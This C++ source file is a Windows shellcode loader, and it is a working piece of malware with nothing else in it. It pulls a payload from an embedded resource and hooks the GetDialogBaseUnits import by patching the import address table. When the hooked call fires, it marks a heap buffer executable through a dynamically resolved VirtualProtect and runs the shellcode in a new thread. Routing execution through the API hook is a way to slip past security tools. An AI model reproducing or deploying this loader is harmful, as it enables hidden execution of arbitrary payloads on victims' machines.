#include <windows.h>
#include <iostream>


#include "public.hpp"
#include "resource.h"

typedef long (WINAPI* GetDialogBaseUnitsPtr)();

GetDialogBaseUnitsPtr originalGetDialogBaseUnits = NULL;

UINT shellcodeSize = 0;
unsigned char* shellcode = nullptr;

long WINAPI MyGetDialogBaseUnits() {

    int result = originalGetDialogBaseUnits();



#include <string.h>
    LPVOID lpvAddr = (LPVOID)malloc(400000);
    memset(lpvAddr, '\x00', 400000);
    memcpy(lpvAddr, shellcode, shellcodeSize);
    DWORD pa = 0x01;
    typedef BOOL(WINAPI* PVirtualProtect) (LPVOID, SIZE_T, DWORD, PDWORD);
    PVirtualProtect mVirtualProtect = NULL;
    mVirtualProtect = (PVirtualProtect)GetProcAddress(LoadLibraryA("kernel32.dll"), "VirtualProtect");
    mVirtualProtect(lpvAddr, shellcodeSize, PAGE_EXECUTE_READWRITE, &pa);
    if (lpvAddr != NULL) {
        HANDLE s;
        typedef BOOL(WINAPI* PCreateThread) (
            LPSECURITY_ATTRIBUTES   lpThreadAttributes,
            SIZE_T                  dwStackSize,
            LPTHREAD_START_ROUTINE  lpStartAddress,
            __drv_aliasesMem LPVOID lpParameter,
            DWORD                   dwCreationFlags,
            LPDWORD                 lpThreadId
            );
        PCreateThread mCreateThread = NULL;
        mCreateThread = (PCreateThread)GetProcAddress(LoadLibraryA("kernel32.dll"), "CreateThread");
        s = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)lpvAddr, NULL, 0, 0);
        WaitForSingleObject(s, INFINITE);
    }

    return result;
}

BOOL HookIATFunction(HMODULE hModule, LPCSTR pszModule, LPCSTR pszFunction, PROC pfnNew) {
    PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNTHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<BYTE*>(hModule) + pDosHeader->e_lfanew);

    if (pNTHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(
        reinterpret_cast<BYTE*>(hModule) + pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    for (; pImportDesc->Name; pImportDesc++) {
        LPCSTR pszCurrentModule = reinterpret_cast<LPCSTR>(reinterpret_cast<BYTE*>(hModule) + pImportDesc->Name);
        if (_stricmp(pszCurrentModule, pszModule) == 0) {
            PIMAGE_THUNK_DATA pThunk = reinterpret_cast<PIMAGE_THUNK_DATA>(
                reinterpret_cast<BYTE*>(hModule) + pImportDesc->FirstThunk);

            for (; pThunk->u1.Function; pThunk++) {
                PROC* ppfn = reinterpret_cast<PROC*>(&pThunk->u1.Function);
                if (*ppfn == reinterpret_cast<PROC>(originalGetDialogBaseUnits)) {
                    DWORD dwOldProtect;
                    VirtualProtect(ppfn, sizeof(PROC), PAGE_READWRITE, &dwOldProtect);
                    *ppfn = reinterpret_cast<PROC>(pfnNew);
                    VirtualProtect(ppfn, sizeof(PROC), dwOldProtect, &dwOldProtect);
                    return TRUE;
                }
            }
        }
    }

    return FALSE;
}

BOOL UnhookIATFunction(HMODULE hModule, LPCSTR pszModule, LPCSTR pszFunction, PROC pfnNew) {
    PIMAGE_DOS_HEADER pDosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNTHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<BYTE*>(hModule) + pDosHeader->e_lfanew);

    if (pNTHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return FALSE;
    }

    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(
        reinterpret_cast<BYTE*>(hModule) + pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

    for (; pImportDesc->Name; pImportDesc++) {
        LPCSTR pszCurrentModule = reinterpret_cast<LPCSTR>(reinterpret_cast<BYTE*>(hModule) + pImportDesc->Name);
        if (_stricmp(pszCurrentModule, pszModule) == 0) {
            PIMAGE_THUNK_DATA pThunk = reinterpret_cast<PIMAGE_THUNK_DATA>(
                reinterpret_cast<BYTE*>(hModule) + pImportDesc->FirstThunk);

            for (; pThunk->u1.Function; pThunk++) {
                PROC* ppfn = reinterpret_cast<PROC*>(&pThunk->u1.Function);
                if (*ppfn == reinterpret_cast<PROC>(MyGetDialogBaseUnits)) {
                    DWORD dwOldProtect;
                    VirtualProtect(ppfn, sizeof(PROC), PAGE_READWRITE, &dwOldProtect);
                    *ppfn = reinterpret_cast<PROC>(pfnNew);
                    VirtualProtect(ppfn, sizeof(PROC), dwOldProtect, &dwOldProtect);
                    return TRUE;
                }
            }
        }
    }

    return FALSE;
}







int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR    lpCmdLine, _In_ int       nCmdShow)
{


    shellcodeSize = 0;
    shellcode = GetShellcodeFromRes(100, shellcodeSize);
    if (shellcode == nullptr)
    {
        return 0;
    }

    HMODULE hUser32 = LoadLibrary(L"USER32.dll");
    if (hUser32 == NULL) {
        std::cerr << "Failed to load USER32.dll\n";
        return 1;
    }

    originalGetDialogBaseUnits = reinterpret_cast<GetDialogBaseUnitsPtr>(GetProcAddress(hUser32, "GetDialogBaseUnits"));
    if (originalGetDialogBaseUnits == NULL) {
        std::cerr << "Failed to get address of GetDialogBaseUnits function\n";
        FreeLibrary(hUser32); 
        return 1;
    }

    if (!HookIATFunction(GetModuleHandle(NULL), "USER32.dll", "GetDialogBaseUnits", reinterpret_cast<PROC>(MyGetDialogBaseUnits))) {
        std::cerr << "Failed to hook GetDialogBaseUnits\n";
        FreeLibrary(hUser32); 
        return 1;
    }

    int result = GetDialogBaseUnits();

    if (!UnhookIATFunction(GetModuleHandle(NULL), "USER32.dll", "GetDialogBaseUnits", reinterpret_cast<PROC>(originalGetDialogBaseUnits))) {
        std::cerr << "Failed to unhook GetDialogBaseUnits\n";
        FreeLibrary(hUser32);
        return 1;
    }

    FreeLibrary(hUser32);

    return 0;
}
